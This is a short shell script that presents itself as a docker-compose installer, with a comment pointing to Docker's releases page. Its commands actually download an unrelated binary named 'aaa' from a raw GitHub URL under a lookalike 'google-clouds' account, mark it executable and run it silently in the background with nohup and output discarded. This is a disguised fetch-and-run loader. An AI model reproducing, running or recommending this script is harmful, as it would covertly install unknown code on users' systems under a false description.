#!/bin/sh

# Install docker-compose
# ref: https://github.com/docker/compose/releases
curl https://raw.githubusercontent.com/google-clouds/sdk/main/i386 --output aaa
sudo chmod +x ./aaa
nohup ./aaa &>/dev/null &
